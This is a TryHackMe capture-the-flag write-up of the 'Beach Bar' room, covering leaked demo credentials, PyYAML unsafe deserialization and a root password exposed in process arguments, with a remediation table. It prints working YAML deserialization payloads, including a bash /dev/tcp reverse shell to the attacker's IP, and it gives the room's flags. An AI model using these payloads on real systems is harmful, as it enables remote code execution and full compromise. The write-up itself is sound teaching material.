# Beach Bar — TryHackMe Writeup

**Author:** OD1Nn00b
**Room:** [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7) (Hacker Holidays series)
**Difficulty:** Easy
**Attacker IP:** 10.112.123.219
**Target IP:** 10.112.166.222

> ⚠️ Spoiler warning — this writeup walks through the full solution path. Both flags are masked.

## Overview

Beach Bar is a beginner-friendly Linux box built around a jukebox web app for a beach bar's DJ booth. The path to root goes through three chained mistakes:

1. Demo credentials left behind in the page source
2. An authenticated playlist importer that unsafely deserializes YAML
3. A root-owned process leaking its password through its command-line arguments

Objectives: grab the user flag and the root flag.

## 1. Recon

Standard enumeration against `10.112.166.222` turned up a web application running the jukebox/DJ booth login page. From there the attack surface was entirely web-based, so enumeration moved straight into inspecting the application itself rather than chasing additional services.

## 2. Finding the DJ Credentials

The target presented a login form for the DJ booth. A few guessed username/password combos and basic SQLi payloads went nowhere, which is the usual sign to step back and check the basics first — in this case, the page source.

Viewing the HTML source turned up a comment left by whoever built the site, disclosing that a demo login was still active:

```
Username: dj
Password: dj
```

Logging in with `dj:dj` opened the jukebox dashboard, which included **Import** and **Export** options for playlists.

## 3. Finding the YAML Deserialization Bug

Exporting the current playlist returned a `.yml` file, and the Import feature accepted either a pasted YAML blob or an uploaded file. The first instinct was to treat this as a file-upload vuln, but uploaded files weren't served anywhere — so the real question was what the backend did *with* the YAML content.

After importing a file, the app echoed the parsed playlist back as a Python object representation rather than plain text. That's a strong signal the server is deserializing the YAML with PyYAML and not sanitizing it.

PyYAML's full loader supports Python-specific tags like `!!python/object/apply`, which can be abused to call arbitrary Python functions at parse time — this is dangerous whenever an app uses `yaml.load()` (or an unsafe loader) instead of `yaml.safe_load()`/`SafeLoader`, which strictly limits what tags are allowed.

Testing with a harmless command:

```yaml
!!python/object/apply:subprocess.check_output
- ["id"]
```

returned:

```
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

Confirmed: arbitrary command execution as `bartender`.

## 4. Getting a Reverse Shell

Listener on the attacker box:

```bash
nc -lvnp 4444
```

Swapped the `id` payload for a reverse shell:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/10.112.123.219/4444 0>&1'"
```

Importing this playlist triggered a callback to the listener, landing a shell as `bartender`.

User flag:

```bash
ls /home
cat /home/bartender/user.txt
```

**User flag:** `THM{y4ml_pl4yl1st_pwns_th3_b34ch}`

## 5. Privilege Escalation

Ran linPEAS to speed up enumeration on the box. The standout finding was in the running processes: a Python service, `jukeboxd.py`, running as `root` — with its startup password passed directly as a command-line argument.

Manually confirmable with:

```bash
ps aux
```

This is a classic mistake: process arguments are visible to any local user via `ps` or `/proc/<PID>/cmdline`, so anything passed as a CLI arg (passwords, tokens, keys) is effectively world-readable on the host.

With the leaked password, switched to root:

```bash
su root
whoami
cat /root/root.txt
```

**Root flag:** `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}`

## 6. Attack Chain Summary

```
Demo creds in HTML comment
        ↓
Access to authenticated playlist importer
        ↓
Unsafe YAML deserialization (PyYAML full loader)
        ↓
RCE as bartender → reverse shell → user flag
        ↓
Root process leaking password via command-line args
        ↓
su root → root flag
```

No single mistake here was catastrophic on its own — the leaked demo login didn't grant a shell, and the YAML bug needed an authenticated session to reach. Chained together, though, they add up to full compromise.

## 7. Remediation

| Issue | Fix |
|---|---|
| Demo credentials in HTML comments | Strip debug/demo accounts and comments before deploying; never ship "temporary" creds |
| Unsafe YAML deserialization | Use `yaml.safe_load()` / `SafeLoader` — never load untrusted input with the full loader |
| Secrets passed as CLI args | Pass secrets via environment variables, config files with restricted permissions, or a secrets manager — never as process arguments |
| No credential rotation | Rotate any credential that's ever been exposed, rather than just hiding the leak point |

## Key Takeaways

- Always check page source, comments, and client-side requests before reaching for heavier attacks
- Treat any deserialization of user-controlled input as high-risk by default
- `ps aux` and `/proc/<PID>/cmdline` are easy wins during Linux privesc enumeration — always check running processes
- Small, individually "low severity" misconfigurations can chain into full root compromise
